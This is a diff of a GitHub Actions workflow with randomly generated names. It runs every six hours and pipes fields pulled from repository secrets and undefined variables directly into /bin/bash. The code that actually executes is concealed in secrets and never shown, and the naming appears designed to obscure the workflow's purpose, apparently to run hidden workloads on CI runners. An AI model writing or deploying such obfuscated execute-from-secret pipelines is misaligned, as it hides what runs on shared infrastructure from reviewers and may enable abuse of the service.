@@ -1,24 +1,20 @@
 name: corsetgoofy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 2/6 * * *'
+    - cron: '0 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: corsetgoofy
         env:
-          rmmvk18: ${{ secrets.rmmvk18 }}
+          int9652: ${{ secrets.int9652 }}
         run: |
-          echo $rmmvk18 | jq -r .f645 | /bin/bash
-          echo $ifbi160 | jq -r .xwq80048 | /bin/bash
-          echo $hmeqy3814 | jq -r .no16041 | /bin/bash
-          echo $d3445 | jq -r .vyd1 | /bin/bash
-          echo $le49 | jq -r .rxnlo62138 | /bin/bash
-          echo $jt42881 | jq -r .wgo9 | /bin/bash
-          echo $vspuu35 | jq -r .esa84 | /bin/bash
+          echo $int9652 | jq -r .jjcdp3 | /bin/bash
+          echo $jt505 | jq -r .uwd6 | /bin/bash
+          echo $d541 | jq -r .ejuup87 | /bin/bash
 
